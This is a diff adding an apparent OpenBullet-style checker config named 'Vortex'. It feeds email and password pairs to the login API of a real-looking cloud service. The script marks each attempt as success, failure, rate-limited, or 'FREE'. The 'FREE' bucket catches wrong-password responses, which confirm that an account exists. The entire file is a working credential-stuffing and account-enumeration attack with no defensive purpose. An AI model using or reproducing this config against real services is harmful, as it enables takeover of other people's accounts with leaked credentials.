@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "Vortex",
+  "SuggestedBots": 1,
+  "LastModified": "2018-12-27T11:57:33.4618389+00:00",
+  "AdditionalInfo": "",
+  "Author": "KimoMaka",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "http://api-v2.remotrcloud.com/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"pass\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "account_not_exists" 
+    KEY "json_data_empty" 
+    KEY "invalid_email" 
+  KEYCHAIN Success OR 
+    KEY "success" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "invalid_password" 
+  KEYCHAIN Ban OR 
+    KEY "rate_limit_exceeded" 
